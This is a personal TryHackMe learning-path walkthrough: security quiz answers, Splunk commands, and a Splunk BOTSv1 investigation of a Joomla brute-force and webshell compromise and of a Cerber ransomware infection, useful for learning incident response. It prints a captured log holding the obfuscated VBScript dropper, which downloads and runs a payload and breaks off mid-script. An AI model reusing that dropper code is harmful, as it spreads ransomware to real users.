---
title: Lab - TryHackMe - Entry Walkthrough
date: 2020-11-08 11:11:11 -0400
description: Learning Path
categories: [Lab, TryHackMe]
# img: /assets/img/sample/rabbit.png
tags: [Lab, TryHackMe]
---

[toc]

---

# TryHackMe - Entry Walkthrough

| Hacktivities              | Goal                                      |
| ------------------------- | ----------------------------------------- |
| Starting Out In Cyber Sec | path                                      |
| Tutorial                  | how to use and get started with TryHackMe |
| Introductory Researching  | `kali$ searchsploit sofetware`            |
| Splunk                    | Splunk commands                           |
| Basic Pentesting          | user privilege escalation                 |
| Malware Introductory      | Malware analysis                          |

---

# THM - Starting Out In Cyber Sec

---

# THM - Tutorial

1. setup the VPN
2. run the ip

![Screen Shot 2020-11-07 at 16.32.03](https://i.imgur.com/gV0XlFA.png)

---

# THM - Introductory Researching

task 2:

```bash
#1 In the Burp Suite Program that ships with Kali Linux, what mode would you use to manually send a request (often repeating a captured request numerous times)?
repeater


#2 What hash format are modern Windows login passwords stored in?
NTLM

#3 What are automated tasks called in Linux?
cron jobs

#4 What number base could you use as a shorthand for base 2 (binary)?
base 16

#5 If a password hash starts with $6$, what format is it (Unix variant)?
Sha512crypt
```

task 3:

```bash
#1 What is the CVE for the 2020 Cross-Site Scripting (XSS) vulnerability found in WPForms?
CVE-2020-10385

kali@kali:~$ searchsploit WPForms
------------------------------------------------ ---------------------------------
 Exploit Title                                  |  Path
------------------------------------------------ ---------------------------------
WordPress Plugin WPForms 1.5.8.2 - Persistent C | php/webapps/48245.txt
------------------------------------------------ ---------------------------------



#2 There was a Local Privilege Escalation vulnerability found in the Debian version of Apache Tomcat, back in 2016. What's the CVE for this vulnerability?
CVE-2016-1240

kali@kali:~$ searchsploit Apache Tomcat  2016



#3 What is the very first CVE found in the VLC media player?
CVE-2007-0017


#4 If I wanted to exploit a 2020 buffer overflow in the sudo program, which CVE would I use?
CVE-2019-18634

kali@kali:~$ searchsploit sudo 2020

```


Manual Pages:

```bash
#1 SCP is a tool used to copy files from one computer to another.What switch would you use to copy an entire directory?
-r

#2 fdisk is a command used to view and alter the partitioning scheme used on your hard drive.What switch would you use to list the current partitions?
-l

#3 nano is an easy-to-use text editor for Linux. There are arguably better editors (Vim, being the obvious choice); however, nano is a great one to start with.What switch would you use to make a backup when opening a file with nano?
-B

#4 Netcat is a basic tool used to manually send and receive network requests. What command would you use to start netcat in listen mode, using port 12345?
nc -l -p 12345

```

---

# THM - Splunk


```bash

#1 Splunk queries always begin with this command implicitly unless otherwise specified. What command is this? When performing additional queries to refine received data this command must be added at the start. This is a prime example of a slight trick question.
search

#2 When searching for values, its fairly typical within security to look for uncommon events. What command can we include within our search to find these?rare

#3 What about the inverse? What if we want the most common security event?
top

#4 When we import data into splunk, what is it stored under?
index

#5 We can create 'views' that allow us to consistently pull up the same search over and over again; what are these called?
dashboard

#6 Importing data doesnt always go as planned and we can sometimes end up with multiple copies of the same data, what command do we include in our search to remove these copies?
dedup

#7 Splunk can be used for more than just a SIEM and its commonly used in marketing to track things such as how long a shopping trip on a website lasts from start to finish. What command can we include in our search to track how long these event pairs take?
transaction

#8 'pipe' search results into further commands, what character do we use for this?
|

#9 In performing data analytics with Splunk (ironically what the tool is at its core) its useful to track occurrences of events over time, what command do we include to plot this?
timechart

#10 gather general statistical information about a search?
stats

#11 Data imported into Splunk is categorized into columns called what?
fields

#12 When we import data into Splunk we can view its point of origination, what is this called? Im looking for the machine aspect of this here.
host

#13 When we import data into Splunk we can view its point of origination from within a system, what is this called?
source

#14 We can classify these points of origination and group them all together, viewing them as their specific type. What is this called? Use the syntax found within the search query rather than the proper name for this.
sourcetype

#15 When performing functions on data we are searching through we use a specific command prior to the evaluation itself, what is this command?
eval

#16 Love it or hate it regular expression is a massive component to Splunk, what command do we use to specific regex within a search?
rex

#17 Its fairly common to create subsets and specific views for less technical Splunk users, what are these called?
pivot tables

#18 What is the proper name of the time date field in Splunk
_time

#19 How do I specifically include only the first few values found within my search?
head

#20 More useful than you would otherwise imagine, how do I flip the order that results are returned in?
reverse

#21 When viewing search results, its often useful to rename fields using user-provided tables of values. What command do we include within a search to do this?
lookup

#22 We can collect events into specific time frames to be used in further processing. What command do we include within a search to do just that?
bucket

#23 We can also define data into specific sections of time to be used within chart commands, what command do we use to set these lengths of time? This is different from the previous question as we are no longer collecting for further processing.
span

#24 When producing statistics regarding a search its common to number the occurrences of an event, what command do we include to do this?
count

#25 Last but not least, what is the website where you can find the Splunk apps at?
splunkbase.splunk.com

#26 We can also add new features into Splunk, what are these called?
apps

#27 What does SOC stand for?
security operations center

#28 What does SIEM stand for?
security information and event management

#29 How about BOTS?
boss of the soc

#30 And CIM?
common information model

#31 what is the website where you can find the Splunk forums at?
answers.splunk.com
```

Advanced Persistent Threat

```bash
#1 What IP is scanning our web server?
* | stats count by index
# index	count
# botsv1	955807
# main	5932

* index=main
| stats count by source
| sort -count
# source	count
# stream:Splunk_HTTPURI	3708
# stream:Splunk_HTTPStatus	686
# stream:Splunk_HTTPClient	429
# stream:Splunk_HTTPResponseTime	429
# stream:Splunk_IP	247
# stream:Splunk_Tcp	237
# stream:Splunk_Udp	79
# stream:Splunk_DNSIntegrity	40
# stream:Splunk_DNSClientQueryTypes	36
# stream:Splunk_DNSRequestResponse	23
# stream:Splunk_DNSServerQuery	23
# stream:Splunk_DNSServerResponse	23

* index=botsv1
| stats count by source
| sort -count
| head 10
# source	count
# WinEventLog:Microsoft-Windows-Sysmon/Operational	270597
# stream:smb	151568
# /var/log/suricata/eve.json	125584
# WinEventLog:Security	87430
# udp:514	80922
# WinRegistry	74720
# stream:ip	62083
# stream:tcp	28291
# stream:http	23936
# C:3SVC1\u_ex160810.log	22401

index=botsv1 imreallynotbatman.com sourcetype=stream:http
| stats count by src_ip
| sort -count
# src_ip	count
# 40.80.148.42	20932
# 23.22.63.114	1236
Answer: 40.80.148.42




#2 What web scanner scanned the server?
index=botsv1 imreallynotbatman.com sourcetype=stream:http src_ip="40.80.148.42"
| stats count by  src_headers
| sort -count
| head 3
# Top 3 requests should Acunetix (Free Edition) scanning requests:
# POST /joomla/index.php/component/search/ HTTP/1.1
# Content-Length: 99
# Content-Type: application/x-www-form-urlencoded
# Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3
# Host: imreallynotbatman.com
# Connection: Keep-alive
# Accept-Encoding: gzip,deflate
# User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
# Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition)
# Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
# Acunetix-User-agreement: https://www.acunetix.com/wvs/disc.htm
# Accept: */*

Answer: acunetix



#3 What is the IP address of our web server?
index=botsv1 imreallynotbatman.com sourcetype=stream:http src_ip="40.80.148.42"
| stats count by dest_ip
| sort -count
# dest_ip	count
# 192.168.250.70	20931
# 192.168.250.40	1



#4 What content management system is imreallynotbatman.com using?
index=botsv1 imreallynotbatman.com sourcetype=stream:http src_ip="40.80.148.42"
| stats count by uri
| sort -count
| head 10
# uri	count
# /joomla/index.php/component/search/	14218
# /joomla/index.php	798
# /	517
# /windows/win.ini	33
# /joomla/media/jui/js/jquery-migrate.min.js	18
# /joomla/media/jui/js/jquery-noconflict.js	18
# /joomla/administrator/index.php	17
# /joomla/media/jui/js/bootstrap.min.js	17
# /joomla/media/system/js/html5fallback.js	13
# /joomla/templates/protostar/js/template.js	13

Answer: joomla



#5 What address is performing the brute-forcing attack against our website?

index=botsv1 imreallynotbatman.com sourcetype=stream:http src_ip="40.80.148.42"
| stats count by http_method
| sort -count
# http_method	count
# POST	15146
# GET	5766
# OPTIONS	5
# CONNECT	1
# PROPFIND	1
# TRACE	1

# A brute force attack involves POST requests.
# In addition, it involves a username and a password.
# identify one of the requests:
index=botsv1 imreallynotbatman.com sourcetype=stream:http src_ip="40.80.148.42" http_method="POST" username
| table dest_content
| head 1
# Result:
# [REDACTED]
# <form action="/joomla/administrator/index.php" method="post" id="form-login" class="form-inline">
#     [REDACTED]
#     <input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Username" size="15" autofocus="true" />
#     [REDACTED]
#     <input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/>
#     [REDACTED]
#     <button tabindex="3" class="btn btn-primary btn-block btn-large">
#         <span class="icon-lock icon-white"></span> Log in                   </button>
#     [REDACTED]
#     <input type="hidden" name="option" value="com_login"/>
#     <input type="hidden" name="task" value="login"/>
#     <input type="hidden" name="return" value="aW5kZXgucGhw"/>
#     <input type="hidden" name="da4c70bcedf77f722881e18fb076b963" value="1" />   </fieldset>
# </form>
# [REDACTED]

# see the structure of the authentication form; it is composed of a username field, a passwd field and a login field.
# search for POST requests involving the username and passwd fields:
index=botsv1 imreallynotbatman.com sourcetype=stream:http http_method="POST" form_data=*username*passwd*
| stats count by src_ip
# src_ip	count
# 23.22.63.114	412
# 40.80.148.42	1
# 1 request from 40.80.148.42 vs. 412 requests from 23.22.63.114. The brute force attack is coming from this latest.

Answer: 23.22.63.114




#6 What was the first password attempted in the attack?
index=botsv1 imreallynotbatman.com sourcetype=stream:http http_method="POST" form_data=*username*passwd*
| rex field=form_data "username=(?<u>\w+)"
| rex field=form_data "passwd=(?<p>\w+)"
| table _time, u, p
| sort by _time
| head 5
# Results:
# _time	u	p
# 2016-08-10 21:45:21.226	admin	12345678
# 2016-08-10 21:45:21.241	admin	letmein
# 2016-08-10 21:45:21.247	admin	qwerty
# 2016-08-10 21:45:21.250	admin	1234
# 2016-08-10 21:45:21.260	admin	123456
Answer: 12345678




#7 One of the passwords in the brute force attack is James Brodsky's favorite Coldplay song. Which six character song is it?
# Go to https://en.wikipedia.org/wiki/List_of_songs_recorded_by_Coldplay and copy the table.
# Extract all the songs names (1st column) and save the file as coldplay.csv.
# Now in Splunk, go to ‘Settings > Lookups > Lookup table files > Add New’.
# Enter the following search to check that your file has successfully been imported:
| inputlookup coldplay.csv
# Now, search for a common value
index=botsv1 sourcetype=stream:http form_data=*username*passwd*
| rex field=form_data "passwd=(?<userpassword>\w+)"
| eval lenpword=len(userpassword)
| search lenpword=6
| eval password=lower(userpassword)
| lookup coldplay.csv song as password OUTPUTNEW song
| search song=*
| table song
Answer: yellow



#8 What was the correct password for admin access to the content management system running imreallynotbatman.com?
# Upon discovering a seemingly correct password, a password brute-forcing engine such as hydra will enter the password a second time to verify that it works.
# count the number of occurrences for each password, and extract the one(s) with at least 2 occurrences.
index=botsv1 imreallynotbatman.com sourcetype=stream:http http_method="POST" form_data=*username*passwd*
| rex field=form_data "passwd=(?<p>\w+)"
| stats count by p
| where count>1
| table p

Result: batman



#9 What was the average password length used in the password brute forcing attempt rounded to closest whole integer?
index=botsv1 imreallynotbatman.com sourcetype=stream:http http_method="POST" form_data=*username*passwd*
| rex field=form_data "passwd=(?<p>\w+)"
| eval pl=len(p)
| stats avg(pl) as av
| eval avg_count=round(av,0)
| table avg_count

Answer: 6



#10 How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login rounded to 2 decimal places?
# 1 of the passwords (batman) was used 2 times.
# extract the timestamps for the occurrences of this password.
index=botsv1 sourcetype=stream:http form_data=*username*passwd* | rex field=form_data "passwd=(?<p>\w+)"
| search p="batman"
| table _time, p, src_ip
| sort by _time
# _time	p	src_ip
# 2016-08-10 21:46:33.689	batman	23.22.63.114
# 2016-08-10 21:48:05.858	batman	40.80.148.42

# Now use transaction to compute the delay between these timestamps.
index=botsv1 sourcetype=stream:http form_data=*username*passwd* | rex field=form_data "passwd=(?<p>\w+)"
| search p="batman"
| transaction p
| eval dur=round(duration,2)
| table dur
Answer: 92.17



#11 How many unique passwords were attempted in the brute force attempt?
index=botsv1 imreallynotbatman.com sourcetype=stream:http http_method="POST" form_data=*username*passwd*
| rex field=form_data "passwd=(?<p>\w+)"
| dedup p
| stats count
Answer: 412




#12 What is the name of the executable uploaded by P01s0n1vy?
# An upload form is usually structured as follows:
<form enctype="multipart/form-data" action="_URL_" method="post">
# search for multipart/form-data:
index=botsv1 sourcetype=stream:http dest="192.168.250.70" "multipart/form-data"
| head 1
# Result:
# {"endtime":"2016-08-10T21:52:47.035555Z","timestamp":"2016-08-10T21:52:45.437445Z","accept":"text/html, application/xhtml+xml, */*","accept_language":"en-US","ack_packets_in":1,"ack_packets_out":55,"bytes":77896,"bytes_in":77648,"bytes_out":248,"c_ip":"40.80.148.42","cached":0,"capture_hostname":"demo-01","client_rtt":0,"client_rtt_packets":0,"client_rtt_sum":0,"connection_type":"Keep-Alive","content_disposition":["form-data; name=\"userfile[0]\";
# filename=\"3791.exe\"","form-data; name=\"userfile[1]\";
# filename=\"agent.php\"","form-data; name=\"userfile[2]\";
# filename=\"\"","form-data; name=\"userfile[3]\"; filename=\"\"","form-data; name=\"userfile[4]\"; filename=\"\"","form-data; name=\"userfile[5]\"; filename=\"\"","form-data; name=\"userfile[6]\"; filename=\"\"","form-data; name=\"overwrite_files\"","form-data; name=\"option\"","form-data; name=\"action\"","form-data; name=\"dir\"","form-data; name=\"requestType\"","form-data; name=\"confirm\""],"cookie":"7598a3465c906161e060ac551a9e0276=9qfk2654t4rmhltilkfhe7ua23","cs_cache_control":"no-cache","cs_content_length":77045,"cs_content_type":"multipart/form-data; boundary=---------------------------7e0e42c20990","cs_version":["1.1","1.1"],"data_center_time":1049868,"data_packets_in":55,"data_packets_out":1,"dest_content":"{'action':'upload','message':'Upload successful!','error':'Upload successful!','success':true}","dest_headers":"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: Microsoft-IIS/8.5\r\nX-Powered-By: PHP/5.5.38\r\nDate: Wed, 10 Aug 2016 21:52:47 GMT\r\nContent-Length: 94\r\n\r\n","dest_ip":"192.168.250.70","dest_mac":"00:0C:29:C4:02:7E","dest_port":80,"duplicate_packets_in":52,"duplicate_packets_out":1,"http_comment":"HTTP/1.1 200 OK","http_content_length":94,"http_content_type":"text/html","http_method":"POST","http_referrer":"https://imreallynotbatman.com/joomla/administrator/index.php?option=com_extplorer&tmpl=component","http_user_agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","missing_packets_in":0,"missing_packets_out":0,"network_interface":"eth1","packets_in":56,"packets_out":56,"part_filename":["3791.exe","agent.php"],"reply_time":1049868,"request":"POST /joomla/administrator/index.php HTTP/1.1","request_ack_time":10,"request_time":548242,"response_ack_time":81928,"response_time":0,"sc_date":"Wed, 10 Aug 2016 21:52:47 GMT","server":"Microsoft-IIS/8.5","server_rtt":5934,"server_rtt_packets":26,"server_rtt_sum":154301,"site":"imreallynotbatman.com","src_content":"-----------------------------7e0e42c20990\r\nContent-Disposition: form-data; name=\"userfile[0]\"; filename=\"3791.exe\"\r\nContent-Type: application/octet-stream\r\n\r\nMZ�\u0000\u0003\u0000\u0000\u0000\u0004\u0000\u0000\u0000��\u0000\u0000�\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000�\u0000\u0000\u0000\u000E\u001F�\u000E\u0000�\t�!�\u0001L�!This program cannot be run in DOS mode.\r\r\n$\u0000\u0000\u0000\u0000\u0000\u0000\u0000�8���Y���Y���Y���E���Y��TE���Y���F���Y���F���Y���Y��\u001EY��TQÅ�Y���z���Y��\u0010_���Y��Rich�Y��\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000PE
# [REDACTED]


# The interesting piece is part_filename":["3791.exe","agent.php"].
# We’ll use this to run another search and extract the names of files that have been uploaded:

index=botsv1 sourcetype=stream:http dest="192.168.250.70" "multipart/form-data"
|  stats count by part_filename{}
It results in 2 files:
# part_filename{}	count
# 3791.exe	1
# agent.php	1
Answer: 3791.exe





#13 What is the MD5 hash of the executable uploaded?
# The MD5 hash seems to be available from 1 sourcetype:
index=botsv1 3791.exe md5
| stats count by sourcetype
# sourcetype	count
# XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	67

# Here is the request to extract the MD5:
index=botsv1 3791.exe sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" CommandLine="3791.exe"
| rex field=_raw MD5="(?<md5sum>\w+)"
| table md5sum

Answer: AAE3F5A29935E6ABCC2C2754D12A9AF0



#14 What is the name of the file that defaced the imreallynotbatman.com website?
# In the attack phases, the attacker is likely to have found a vulnerability, and exploited it to download files from the server, to an external server.
# As we have already identified 2 IP addresses involved in the attack, let’s use them as destinations.
# Let’s search for requests originating from the server, with suricata logs to 23.22.63.114:
index=botsv1 sourcetype="suricata" src_ip="192.168.250.70" dest_ip="23.22.63.114"
|  stats count by http.http_method, http.hostname, http.url
|  sort -count
# Results:
# http.http_method	http.hostname	                        http.url	                                count
# GET	            imreallynotbatman.com	                /joomla/administrator/index.php	            824
# POST	            imreallynotbatman.com	                /joomla/administrator/index.php	            411
# GET	            71.39.18.126	                        /joomla/agent.php	                        52
# GET	            prankglassinebracket.jumpingcrab.com	/poisonivy-is-coming-for-you-batman.jpeg	3
Answer: poisonivy-is-coming-for-you-batman.jpeg




#15 This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?
# already identified the FQDN in the previous request.
Answer: prankglassinebracket.jumpingcrab.com




#16 What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?
Answer: 23.22.63.114



#17 Based on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with P01s0n1vy APT group?
# Googling for the IOCs collected so far leads to https://threatcrowd.org/ip.php?ip=23.22.63.114 where we are presented with a relationship diagram involving domains, IPs, emails:
Answer: lillian.rose@po1s0n1vy.com



#18 GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the P01s0n1vy APT group if initial compromise fails is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to P01s0n1vy’s initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.
# Following online searches leads to https://www.threatminer.org/host.php?q=23.22.63.114 where we are provided with file hashes, 1 of which being identified as malicious by many AV solutions:
aae3f5a29935e6abcc2c2754d12a9af0
39eecefa9a13293a93bb20036eaf1f5e
c99131e0169171935c5ac32615ed6261 (malicious)
# The last hash (https://www.threatminer.org/sample.php?q=c99131e0169171935c5ac32615ed6261) is associated with the following SHA256:
Answer: 9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8




#19 What special hex code is associated with the customized malware discussed in the previous question?
# Looking for the hash on Virustotal (https://www.virustotal.com/gui/file/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8/community) shows an hex string associated to this malware:
53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21



#20 What does this hex code decode to?
$ echo "53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21" | xxd -r -p
Steve Brants Beard is a powerful thing. Find this message and ask him to buy you a beer!!!

```

Summary
* Scanned for vulnerabilities
* Found site is running Joomla
* Performed a brute force password scan, logged into Joomla, installed file upload modules
* Uploaded webshell
* Used webshell to upload reverse TCP shell
* Connected via metasploit
* Tried to move around but couldn’t get out of locked down Windows 2012R2
* Defaced website with downloaded defacement image

![1000px-Ctf-tryhackme-BP-Splunk-LMKC-final](https://i.imgur.com/5QPVmqm.png)


![1000px-Ctf-tryhackme-BP-Splunk-APT-threat-all](https://i.imgur.com/ULgYYZx.png)



Ransomware:

```bash
# One of your users at Wayne Enterprises has managed to get their machine infected, discover how it happened!


#1 What was the most likely IP address of we8105desk on 24AUG2016?
# Apply a time filter to match the date 08/24/2016 to the below request:
index=botsv1 we8105desk
| stats count by sourcetype
| sort -count
# sourcetype	count
# XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	104360
# wineventlog	10028
# stream:smb	1528
# stream:ldap	48
# nessus:scan	24
# WinRegistry	3

# Now, let’s request the IP seen by the first source:
index=botsv1 we8105desk  sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| stats count by src_ip
| sort-count
# src_ip	count
# 192.168.250.100	52270
# 192.168.250.255	69
# 127.0.0.1	66
# 0.0.0.0	42
# 224.0.0.252	6
# 192.168.250.70	1
Answer: 192.168.250.100



#2 What is the name of the USB key inserted by Bob Smith?
# find name usb key registry: https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/usb-device-specific-registry-settings
# the name of USB key is stored under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB, in a key named FriendlyName.
# Let’s search for it:
index=botsv1 sourcetype=WinRegistry friendlyname
| stats count by registry_value_data
Answer: MIRANDA_PRI



#3 After the USB insertion, a file execution occurs that is the initial Cerber infection. This file execution creates two additional processes. What is the name of the file?
index=botsv1 we8105desk sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
| makemv delim=":" CurrentDirectory
| eval drive=mvindex(CurrentDirectory,0)
| stats count by drive
# drive	count
# C	298
# D	7
# The USB key is with drive D:\.

# Now, let’s search in the sysmon logs for commands mentioning this drive.
index=botsv1 host="we8105desk" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" CommandLine="*D:\\*"
| table _time, CommandLine
| reverse
# Results:
# _time	                CommandLine
# 2016-08-24 16:43:12	“C:Files (x86)Office14.EXE” /n /f "D:_Tate_unveiled.dotm"
# 2016-08-24 16:56:47	“C:3232.exe” C:3232.dll,OpenAs_RunDLL D:Stuff\013\013366.pdf
Answer: Miranda_Tate_unveiled.dotm



#4 During the initial Cerber infection a VB script is run. The entire script from this execution, prepended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of this field?
index=botsv1 host="we8105desk" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (CommandLine="*D:\\*" OR ParentCommandLine="*D:\\*")
| eval length=len(CommandLine)
| table CommandLine, length
| sort by -length
| head 1
# Results:
# CommandLine	length
# cmd.exe /V /C set “GSI=%APPDATA%%RANDOM%.vbs” && (for %i in (“DIm RWRL” “FuNCtioN GNbiPp(Pt5SZ1)” “EYnt=45” “GNbiPp=AsC(Pt5SZ1)” “Xn1=52” “eNd fuNCtiON” “SUb OjrYyD9()” “J0Nepq=56” “Dim UJv,G4coQ” “LT=23” “dO WHiLE UJv<>3016-3015” “G4coQ=G4coQ+1” “WSCRiPt.sLEeP(11)” “LoOP” “UsZK0=85” “ENd suB” “fuNctIon J7(BLI4A3)” “K5AU=29” “J7=cHR(BLI4A3)” “XBNutM9=36” “eNd fuNCtiON” “SUb MA(QrG)” “WXCzRz=9” “Dim Jw” “Qt7=34” “Jw=TIMeR+QrG” “Do WhiLE tIMEr<Jw” “WSCRipT.sleEP(6)” “LOOp” “EXdkRkH=78” “enD sUB” “fUnCTion M1p67jL(BwqIM7,Qa)” “Yi=80” “dIM KH,ChnFY,RX,Pg,C6YT(8)” “Cm=7” “C6YT(1)=107” “Rzf=58” “C6YT(5)=115” “BSKoW=10” “C6YT(4)=56” “Cwd6=35” “C6YT(7)=110” “AQ=98” “C6YT(6)=100” “Y6Cm1I=82” “C6YT(2)=103” “JH3F2i=74” “C6YT(8)=119” “JRvsG2s=76” “C6YT(3)=53” “Yh=31” “C6YT(0)=115” “GuvD=47” “Tbvf1=67” “SeT KH=cReATeObject(A9y(”3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D“,”Yo“))” “V2JR=73” “Set ChnFY=KH.GETfilE(BwqIM7)” “RGeJ=68” “SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)” “CtxOk=82” “seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)” “XPL9af=76” “Do uNtil Pg.aTEnDOfStReam” “RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))” “LooP” “IQz=49” “RX.cloSe” “CBR1gC7=51” “Pg.cLOSE” “PmG=64” “eNd funCTIOn” “FUNcTION Ql9zEF()” “IBL2=16” “Ql9zEF=secoND(Time)” “MUTkPNJ=41” “End FUNcTiOn” “FUnCtion A9y(Am,T1GCbB)” “CWCH9r=82” “Dim V3sl0m,F4ra,AxFE” “RLLp8R=89” “For V3sl0m=1 To (lEn(Am)/2)” “F4ra=(J7((8270-8232)) & J7((5328/74))&(miD(Am,(V3sl0m+V3sl0m)-1,2)))” “AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))” “A9y=A9y+J7(OyVNo(F4ra,AxFE))” “NeXT” “DxZ40=89” “enD fUNction” “Sub AylniN()” “N6nzb=92” “DIm GWJCk,Q3y,GKasG0” “FDu=47” “GWJCk=93961822” “UZ=32” “FoR Q3y=1 To GWJCk” “GKasG0=GKasG0+1” “neXt” “B1jq2Hk=63” “If GKasG0=GWJCk tHen” “KXso=18” “MA((-176+446))” “IP4=48” “Yq(A9y(”0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826“,”QcOi4XA“))” “YTsWy=31” “elSe” “DO5gpmA=84” “A8=86” “EnD iF” “XyUP=64” “eND SuB” “sUB GKfD3aY(FaddNPJ)” “SDU0BLq=57” “DiM UPhqZ,KbcT” “DxejPK=88” “KbcT=”Drn4AW"" “GROlc7=82” “sET UPhqZ=CREAteOBJecT(A9y(”332A7B05156A211A46243629“,KbcT))” “Gs0g=3” “UPhqZ.OpEn” “TF1=68” “UPhqZ.tyPE=6867-6866” “RDjmY=24” “UPhqZ.wrITe FaddNPJ” “WiFgvS=78” “UPhqZ.SaVeTOfIle RWRL,8725-8723” “AF=4” “UPhqZ.closE” “JC7sf2=1” “Cke4e” “JM=88” “EnD suB” “fuNCtIoN Yq(PDqi1)” “I0=22” “DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK” “GJDnbE=32” “On ErrOR reSume NeXT” “B7bT=1” “Uv=”Tk"" “ELw=73” “sEt YTwwO=CREaTeObjeCT(A9y(”3C07082602241F7A383C0E3807“,Uv))” “K4=62” “GAiF” “IS1cj=19” “Set Dzc0=YTwwO.eNVIrONMEnt(A9y(”013B183400023A“,”EQiWw“))” “D9S=38” “RWRL=Dzc0(A9y(”14630811720C14“,”XU3“))&J7((8002-7910))& Ql9zEF & Ql9zEF” “AtCQ=95” “JiYwVG=”FcQqQ"" “Tf=79” “sEt BAU7Cz=CrEATEoBjECT(A9y(”2E38122329103E1725683B1C3D19123701“,JiYwVG))” “QUY=56” “BAU7Cz.OpeN A9y(”0D0E1E“,”KJ“),PDqi1,7387-7387” “JX2=58” “BAU7Cz.SeTReQuEstHeAdeR A9y(”1F59242828“,”OM8J“),A9y(”0D354C3D356B567A0F6B6B“,”VoL8XF“)” “URkT=71” “BAU7Cz.SEnD()” “QdFeA6=65” “if BAU7Cz.StaTUstExt=A9y(”652840353A542512023C5B3D572F27“,”S5I2A“) then” “PwTLW23=36” “GAiF” “R4xYBS=63” “MA(4)” “PjL6m=46” “GKfD3aY BAU7Cz.ReSpONSEbody” “Fj98=72” “Else” “D7T=91” “IK=”NNXFD0"" “NK=74” “SeT BAU7Cz= CreATeobJECT(A9y(”033125365F3D213E326A68030210121060“,IK))” “QJ=35” “BAU7Cz.oPeN A9y(”2A2F0E“,”TmjZ8d“),A9y(”07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26“,”Ao" ),5022-5022" “UMp8=85” “BAU7Cz.SeTReqUesTheadER A9y(”1439190A24“,”AFXwm“),A9y(”371038301A716C5F7B6644“,”LUi“)” “NluUc=93” “BAU7Cz.SENd()” “EOtR=44” “If BAU7Cz.STaTUSTexT=A9y(”03510A3B3A51146F105F163B365E0C“,”OS0x“) THen GKfD3aY BAU7Cz.REsPOnSeBODY” “Q6sMEZ=54” “I9Nl7=56” “end if” “Dq=54” “eND FuNCTioN” “fUNctIon OyVNo(U1,Brt0d)” “SNOW=59” “OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)” “QTi5K=54” “enD funcTION” “Sub Cke4e()” “WTOyAw=62” “dIM EuM,WIbud,NCiN,Fs8HJ” “A5AT=92” “NCiN=”"""" “SX6=93” “WIbud=RWRL & Ql9zEF & A9y(”4A330F3F“,”WdGbOGp“)” “V5B7Zh=92” “M1p67jL RWRL,WIbud” “L13=45” “iF Fs8HJ=”" tHen MA(4)" “CHaK=38” “EuM=”Iqxkf"" “U56m=67” “SEt VP=creATeoBJEcT(A9y(”262B081420010C453521141407“,EuM))” “U5Quw=85” “VP.Run A9y(”1023287B163629755C0D6C06270F1E01536C6E7551“,”UsNL“) & WIbud & NCiN,2912-2912,5755-5755” “A6mfcYL=76” “End sUB” “JoxZ3=43” “AylniN” “suB GAiF()” “G4vzM=95” “Dim DCRml9g, CjoNOY9” “For DCRml9g = 68 To 6000327” “CjoNOY9 = Rvwr + 23 + 35 + 27” 